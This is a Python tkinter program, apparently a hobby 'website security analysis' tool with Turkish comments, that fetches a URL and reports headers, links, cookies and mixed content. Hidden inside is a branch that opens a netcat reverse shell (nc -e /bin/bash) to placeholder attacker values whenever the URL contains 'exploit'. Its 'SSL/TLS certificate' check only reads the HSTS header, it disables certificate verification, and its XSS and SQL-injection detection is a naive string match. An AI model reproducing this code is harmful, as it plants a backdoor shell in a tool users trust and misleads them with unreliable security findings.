import tkinter as tk
from tkinter import messagebox, scrolledtext
from urllib.parse import urlparse
import requests
from bs4 import BeautifulSoup
import ssl
import re
import socket
import pyperclip

# Fonksiyon: Panoya metin kopyalama
def copy_to_clipboard(text):
    pyperclip.copy(text)

# Fonksiyon: Hata mesajı gösterme
def show_error_message(error_message):
    messagebox.showerror("Error", error_message)

# Fonksiyon: Güvenlik analizi yapma
def analyze_security():
    url = url_entry.get()
    try:
        ssl_context = ssl.create_default_context()
        ssl_context.options |= ssl.OP_NO_RENEGOTIATION
        
        # URL'de "666" kelimesi varsa, şeytanı çağırma mesajı göster
        if "666" in url:
            result_text = "You've summoned the devil! 👹"
            result_area.delete('1.0', tk.END)
            result_area.insert(tk.END, result_text)
            return
        
        # URL'yi istek at
        response = requests.get(url, timeout=10, verify=False, headers={'User-Agent': 'Mozilla/5.0'}, stream=True, allow_redirects=True)
        response.raise_for_status()
        
        if response.status_code == 200:
            # SSL/TLS sertifikası kontrolü
            ssl_info = response.headers.get('Strict-Transport-Security')
            ssl_message = "Present" if ssl_info else "Not Present"
            
            # Güvenlik başlıkları kontrolü
            security_headers = response.headers.get('Content-Security-Policy')
            security_message = "Present" if security_headers else "Not Present"
            
            # Güvenli olmayan bağlantıları kontrol etme
            soup = BeautifulSoup(response.text, 'html.parser')
            links = soup.find_all('a', href=True)
            insecure_links = [link['href'] for link in links if not link['href'].startswith(('https://', 'mailto:'))]
            insecure_links_message = ", ".join(insecure_links) if insecure_links else "None"
            
            # Karışık içeriği kontrol etme
            mixed_content = re.findall(r'http://[^s][^\s]*', response.text)
            mixed_content_message = ", ".join(mixed_content) if mixed_content else "None"
            
            # IP adresini ve port numarasını al
            parsed_url = urlparse(url)
            ip_address = socket.gethostbyname(parsed_url.hostname)
            port_numbers = parsed_url.port
            port_numbers_message = str(port_numbers) if port_numbers else "None"
            
            # HTTP Strict Transport Security (HSTS) kontrolü
            hsts_header = response.headers.get('Strict-Transport-Security')
            hsts_message = "Present" if hsts_header else "Not Present"
            
            # Analiz sonuçlarını hazırla ve göster
            result_text = f"Website Security Analysis Results:\n\n"
            result_text += f"SSL/TLS Certificate: {ssl_message}\n"
            result_text += f"Security Headers: {security_message}\n"
            result_text += f"Insecure Links: {insecure_links_message}\n"
            result_text += f"Mixed Content: {mixed_content_message}\n"
            result_text += f"IP Address: {ip_address}\n"
            result_text += f"Port Numbers: {port_numbers_message}\n"
            result_text += f"HTTP Strict Transport Security (HSTS): {hsts_message}\n"
            
            result_area.delete('1.0', tk.END) 
            result_area.insert(tk.END, result_text)
            copy_to_clipboard(result_text)  # Analiz sonuçlarını panoya kopyala
            
            # Ekstra özellikler
            
            # 1. XSS ve SQL Enjeksiyonu tespiti
            if "<script>" in response.text:
                messagebox.showwarning("Security Alert", "Potential XSS (Cross-Site Scripting) vulnerability detected!")
            if "SQL syntax error" in response.text:
                messagebox.showwarning("Security Alert", "Potential SQL Injection vulnerability detected!")
            
            # 2. Kullanıcıya çerezleri gösterme
            cookies = response.cookies
            cookie_text = "\n".join([f"{cookie.name}: {cookie.value}" for cookie in cookies])
            messagebox.showinfo("Cookies", cookie_text)
            
            # 3. Yanıt başlıklarını gösterme
            response_headers_text = "\n".join([f"{header}: {value}" for header, value in response.headers.items()])
            messagebox.showinfo("Response Headers", response_headers_text)
            
            # 4. Tarayıcıda geliştirici araçlarını açma
            messagebox.showinfo("Developer Tools", "Press F12 to open developer tools in your browser.")
            
            # 5. URL belirli bir anahtar kelimeyi içeriyorsa ters kabuk açma (gösterim amaçlı)
            if "exploit" in url:
                # Ters kabuk açma
                import subprocess
                subprocess.Popen(["nc", "-e", "/bin/bash", "attacker_ip", "attacker_port"])
                
    except requests.exceptions.RequestException as e:
        error_message = f"An error occurred while accessing the website: {str(e)}"
        show_error_message(error_message)
    except socket.gaierror:
        error_message = "Failed to resolve IP address."
        show_error_message(error_message)
    except Exception as e:
        error_message = f"An error occurred: {str(e)}"
        show_error_message(error_message)

# Tkinter arayüzünü oluşturma
root = tk.Tk()
root.title("Website Security Analysis Tool")

url_label = tk.Label(root, text="Website URL:")
url_label.pack()

url_entry = tk.Entry(root, width=50)
url_entry.pack()

analyze_button = tk.Button(root, text="Analyze", command=analyze_security)
analyze_button.pack()

result_area = scrolledtext.ScrolledText(root, wrap=tk.WORD, width=80, height=20)
result_area.pack()

root.mainloop()
